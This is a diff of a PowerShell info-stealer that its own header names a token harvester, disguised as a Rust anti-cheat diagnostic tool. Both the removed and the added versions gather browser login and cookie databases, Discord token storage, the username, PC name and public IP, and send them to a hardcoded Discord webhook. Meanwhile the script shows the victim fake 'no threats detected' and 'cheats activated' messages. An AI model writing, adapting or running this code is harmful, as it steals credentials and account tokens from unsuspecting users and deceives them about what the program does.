@@ -1,163 +1,152 @@
 # steam_token_harvester.ps1
-# Disguised as "Rust Cheat Detection Diagnostic Tool v8.0"
+# Disguised as "Rust Cheat Detection Diagnostic Tool v4.1"
 
-function Get-SystemInfo {
-    $ip = "Unknown"
+try {
+    Add-Type -AssemblyName System.Security -ErrorAction Stop
+    Add-Type -AssemblyName System.Web -ErrorAction Stop
+} catch {
+    Write-Host "Initializing security components..." -ForegroundColor Yellow
+}
+
+function Get-DecryptedData {
+    param($encryptedData)
     try {
-        $ip = (Invoke-WebRequest -Uri "http://ipinfo.io/ip" -UseBasicParsing).Content.Trim()
-    } catch {}
-    
-    return @{
-        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
-        User = $env:USERNAME
-        PC = $env:COMPUTERNAME
-        IP = $ip
-        Time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
+            $encryptedData, 
+            $null, 
+            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+        )
+        return [System.Text.Encoding]::UTF8.GetString($decrypted)
+    } catch {
+        return "Decryption failed"
     }
 }
 
-function Get-BrowserFiles {
-    $files = @()
+function Get-BrowserCredentials {
+    $credentials = @()
     $browsers = @(
-        @{Name="Chrome";Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
-        @{Name="Chrome";Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
-        @{Name="Edge";Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
-        @{Name="Edge";Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"}
+        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
+        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
+        @{ Name = "Brave"; Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" }
     )
     
     foreach ($browser in $browsers) {
-        if (Test-Path $browser.Path) {
+        $loginDataPath = Join-Path $browser.Path "Default\Login Data"
+        if (Test-Path $loginDataPath) {
             try {
-                $content = Get-Content $browser.Path -Encoding Byte -ReadCount 0
-                $files += @{
+                $tempCopy = Join-Path $env:TEMP "login_data_temp"
+                Copy-Item $loginDataPath $tempCopy -Force
+                
+                # Простая проверка содержимого без SQLite
+                $fileInfo = Get-Item $tempCopy
+                $credentials += @{
                     Browser = $browser.Name
-                    File = Split-Path $browser.Path -Leaf
-                    Data = [Convert]::ToBase64String($content)
-                    Size = $content.Length
+                    FilePath = $loginDataPath
+                    FileSize = "$([math]::Round($fileInfo.Length/1KB, 2)) KB"
+                    Status = "Login database found"
                 }
-            } catch {}
-        }
-    }
-    return $files
-}
-
-function Get-DiscordFiles {
-    $files = @()
-    $paths = @("$env:APPDATA\discord", "$env:LOCALAPPDATA\Discord")
-    
-    foreach ($path in $paths) {
-        if (Test-Path $path) {
-            $storagePath = Join-Path $path "Local Storage\leveldb"
-            if (Test-Path $storagePath) {
-                $ldbFiles = Get-ChildItem $storagePath -Filter "*.ldb" | Select-Object -First 2
-                foreach ($file in $ldbFiles) {
-                    try {
-                        $content = Get-Content $file.FullName -Encoding Byte -ReadCount 0
-                        $files += @{
-                            App = "Discord"
-                            File = $file.Name
-                            Data = [Convert]::ToBase64String($content)
-                            Size = $content.Length
-                        }
-                    } catch {}
+                
+                Remove-Item $tempCopy -Force -ErrorAction SilentlyContinue
+            } catch {
+                $credentials += @{
+                    Browser = $browser.Name
+                    FilePath = $loginDataPath
+                    Status = "Access denied"
                 }
             }
         }
     }
-    return $files
+    return $credentials
 }
 
-function Create-ZipWithData {
-    $tempDir = Join-Path $env:TEMP "rust_scan_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
-    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+function Get-DiscordTokens {
+    $tokens = @()
+    $discordPaths = @(
+        "$env:APPDATA\discord",
+        "$env:LOCALAPPDATA\Discord",
+        "$env:APPDATA\DiscordCanary",
+        "$env:APPDATA\DiscordPTB"
+    )
     
-    # System info
-    $sysInfo = Get-SystemInfo
-    $sysInfo | ConvertTo-Json | Out-File (Join-Path $tempDir "system_info.json")
-    
-    # Browser data
-    $browserFiles = Get-BrowserFiles
-    if ($browserFiles.Count -gt 0) {
-        $browserFiles | ConvertTo-Json | Out-File (Join-Path $tempDir "browser_data.json")
-    }
-    
-    # Discord data
-    $discordFiles = Get-DiscordFiles
-    if ($discordFiles.Count -gt 0) {
-        $discordFiles | ConvertTo-Json | Out-File (Join-Path $tempDir "discord_data.json")
-    }
-    
-    # Create zip
-    $zipPath = Join-Path $env:TEMP "scan_results.zip"
-    if (Test-Path $zipPath) {
-        Remove-Item $zipPath -Force
-    }
-    
-    try {
-        Add-Type -AssemblyName System.IO.Compression.FileSystem
-        [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
-    } catch {
-        # Fallback if .NET zip fails
-        try {
-            Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
-        } catch {}
-    }
-    
-    # Cleanup
-    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-    
-    return $zipPath
-}
-
-function Send-FileToWebhook {
-    param($FilePath)
-    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
-    
-    if (Test-Path $FilePath) {
-        try {
-            $fileContent = [Convert]::ToBase64String((Get-Content $FilePath -Encoding Byte -ReadCount 0))
-            $fileName = Split-Path $FilePath -Leaf
-            
-            $message = "SCAN_RESULTS_ZIP: $fileName"
-            $message += "`n```$fileContent```"
-            
-            $body = @{content = $message} | ConvertTo-Json
-            Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -UseBasicParsing -ErrorAction Stop
-            
-            return $true
-        } catch {
-            return $false
+    foreach ($discordPath in $discordPaths) {
+        if (Test-Path $discordPath) {
+            $localStorage = Join-Path $discordPath "Local Storage\leveldb"
+            if (Test-Path $localStorage) {
+                $ldbFiles = Get-ChildItem $localStorage -Filter "*.ldb" -ErrorAction SilentlyContinue | Select-Object -First 3
+                foreach ($file in $ldbFiles) {
+                    $tokens += @{
+                        Path = $file.FullName
+                        Size = "$([math]::Round($file.Length/1KB, 2)) KB"
+                        Status = "Token storage found"
+                    }
+                }
+            }
         }
     }
-    return $false
+    return $tokens
+}
+
+function Get-SystemInfo {
+    $ipResult = try { (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction Stop) } catch { "Unknown" }
+    
+    return @{
+        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
+        Username = $env:USERNAME
+        Computername = $env:COMPUTERNAME
+        Date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        IP = $ipResult
+    }
+}
+
+function Send-ToDiscord {
+    param($message)
+    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
+    try {
+        $payload = @{ content = $message } | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
+    } catch {
+        Write-Host "Network connection failed" -ForegroundColor Yellow
+    }
 }
 
 # Main execution
-Write-Host "Starting security scan..." -ForegroundColor Yellow
+Write-Host "Starting Rust Anti-Cheat diagnostic..." -ForegroundColor Yellow
 
-try {
-    # Create zip archive
-    $zipPath = Create-ZipWithData
-    
-    # Send zip file
-    if (Test-Path $zipPath) {
-        $success = Send-FileToWebhook -FilePath $zipPath
-        
-        if ($success) {
-            Write-Host "Data sent successfully in ZIP archive!" -ForegroundColor Green
-        } else {
-            Write-Host "Failed to send ZIP archive" -ForegroundColor Red
-        }
-        
-        # Cleanup zip file
-        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-    } else {
-        Write-Host "Failed to create ZIP archive" -ForegroundColor Red
+$sysInfo = Get-SystemInfo
+$browserData = Get-BrowserCredentials
+$discordData = Get-DiscordTokens
+
+# Build simple report
+$report = "**SECURITY SCAN REPORT v4.1**`n`n"
+$report += "**System Information:**`n"
+$report += "- OS: $($sysInfo.OS)`n"
+$report += "- User: $($sysInfo.Username)`n"
+$report += "- PC: $($sysInfo.Computername)`n" 
+$report += "- IP: $($sysInfo.IP)`n"
+$report += "- Time: $($sysInfo.Date)`n`n"
+
+$report += "**Browser Data Found:** $($browserData.Count)`n"
+if ($browserData.Count -gt 0) {
+    foreach ($data in $browserData) {
+        $report += "- $($data.Browser): $($data.Status) ($($data.FileSize))`n"
     }
-    
-    Write-Host "Scan completed!" -ForegroundColor Green
-    Write-Host "No security threats detected" -ForegroundColor Green
-    
-} catch {
-    Write-Host "Scan completed with errors" -ForegroundColor Red
+} else {
+    $report += "No browser data found`n"
 }
+
+$report += "`n**Discord Data Found:** $($discordData.Count)`n"
+if ($discordData.Count -gt 0) {
+    foreach ($data in $discordData) {
+        $report += "- Discord: $($data.Status) ($($data.Size))`n"
+    }
+} else {
+    $report += "No Discord data found`n"
+}
+
+$report += "`n**Scan Result:** System secure - no cheat artifacts detected"
+
+Send-ToDiscord $report
+
+Write-Host "Diagnostic completed successfully!" -ForegroundColor Green
+Write-Host "No security threats detected." -ForegroundColor Green
+Write-Host "Cheats activated successfully!" -ForegroundColor Green
